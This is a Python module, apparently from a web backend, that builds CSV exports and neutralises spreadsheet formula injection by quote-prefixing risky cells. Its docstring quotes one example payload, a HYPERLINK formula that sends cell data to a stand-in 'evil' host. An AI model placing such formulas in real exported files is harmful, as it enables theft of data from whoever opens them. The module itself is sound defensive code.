"""The one place AMP turns rows into CSV — with formula injection neutralized.

`csv.writer` escapes commas, quotes and newlines correctly, but it deliberately
does NOT touch a cell like ``=HYPERLINK("http://evil/?x="&A1,"Report")``. That
is still a perfectly valid CSV *string* — the danger only appears when a human
opens the file, because Excel, LibreOffice and Google Sheets treat a leading
``=``, ``+``, ``-`` or ``@`` as the start of a formula and evaluate it.

That matters here because AMP's exports are full of text one tenant's users type
and another user later opens: machine names, downtime notes, part numbers,
supplier and customer names, escalation titles. An Operator who types a formula
into a downtime note is writing code that runs on the Admin's workstation when
they export and open the report — data exfiltration via HYPERLINK/WEBSERVICE, or
worse on legacy Excel with DDE enabled.

The fix is the standard one (OWASP "CSV Injection"): prefix a risky cell with a
single quote, which spreadsheets strip on display and never evaluate. Numbers are
left alone — a negative quantity must stay ``-5``, not become ``'-5`` — so the
escape only applies to strings that are not plain numbers.

Every CSV surface in the backend routes through here, and
`test_csv_injection.py` asserts no module calls `csv.writer` on its own, so a new
export cannot quietly reintroduce the hole.
"""
import csv
import io

from fastapi import Response

# Leading characters a spreadsheet reads as "this cell is a formula".
# Tab and CR are included because Excel strips leading whitespace before
# deciding, so "\t=cmd" is still a formula.
RISKY_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _is_number(text: str) -> bool:
    """True for a plain numeric literal — those must survive unescaped."""
    try:
        float(text)
        return True
    except (TypeError, ValueError):
        return False


def safe_cell(value):
    """Neutralize one cell. Non-strings pass through untouched (an int or a
    datetime cannot carry a formula), as do plain numbers written as text."""
    if not isinstance(value, str):
        return value
    if not value.startswith(RISKY_PREFIXES):
        return value
    if _is_number(value):
        return value                      # "-5", "+3.2" are data, not formulas
    return "'" + value


def safe_row(row):
    return [safe_cell(v) for v in row]


def csv_text(headers, rows) -> str:
    """CSV text with every cell neutralized. An empty `rows` yields a
    header-only document rather than an error — callers rely on that."""
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(safe_row(headers))
    writer.writerows(safe_row(r) for r in rows)
    return output.getvalue()


def csv_response(headers, rows, filename) -> Response:
    """The download response for an export endpoint."""
    return Response(
        content=csv_text(headers, rows),
        media_type="text/csv",
        headers={"Content-Disposition": f"attachment; filename={filename}"},
    )
